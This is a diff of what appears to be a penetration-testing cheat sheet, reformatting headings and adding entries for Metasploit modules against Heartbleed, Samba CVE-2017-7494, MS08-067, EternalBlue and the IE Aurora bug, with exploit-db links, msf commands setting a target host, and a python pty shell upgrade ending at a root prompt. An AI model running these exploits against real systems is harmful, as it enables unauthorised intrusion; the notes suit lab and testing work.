@@ -1,6 +1,6 @@
 
 
-*HEARTBLEED*
+=== HEARTBLEED ===
 -----
 
 msf > use auxiliary/scanner/ssl/openssl_heartbleed 
@@ -56,7 +56,7 @@ msf auxiliary(openssl_heartbleed) > run
 msf auxiliary(openssl_heartbleed) > 
 
 
-*SAMBA CVE-2017-7494*
+=== SAMBA CVE-2017-7494 ===
 -----
 msf exploit(is_known_pipename) > use exploit/linux/samba/is_known_pipename 
 msf exploit(is_known_pipename) > set RHOST 10.1.1.4
@@ -77,24 +77,27 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 root@1d71e2ebf7b6:/tmp# exit
 
 
-*Microsoft RPC - MS08-067. Code execution *
+=== Microsoft RPC - MS08-067. Code execution ===
 ----
 https://www.exploit-db.com/exploits/16362/
 use exploit/windows/smb/ms08_067_netapi
-options
-info
-
 Standalone exploit:
 https://www.exploit-db.com/exploits/7104/
 
-SMB Eternalblue:
+=== SMB Eternalblue: ===
 windows/smb/ms17_010_eternalblue
+windows/smb/ms17_010_psexec
 https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue
 
-MS03-026 Microsoft RPC DCOM Interface Overflow* // *CVE-2003-0352
+=== MS03-026 Microsoft RPC DCOM Interface Overflow* // *CVE-2003-0352 ===
 -----
 use exploit/windows/dcerpc/ms03_026_dcom
 https://www.exploit-db.com/exploits/16749/
 https://www.securityfocus.com/bid/8205/exploit
 https://blog.rapid7.com/2012/05/22/10-hottest-metasploit-exploit-and-auxiliary-modules-in-april/
+
+=== Internet Explorer Aurora ===
+use windows/browser/ms10_002_aurora
+https://blog.rapid7.com/2010/01/15/reproducing-the-aurora-ie-exploit/
+
 
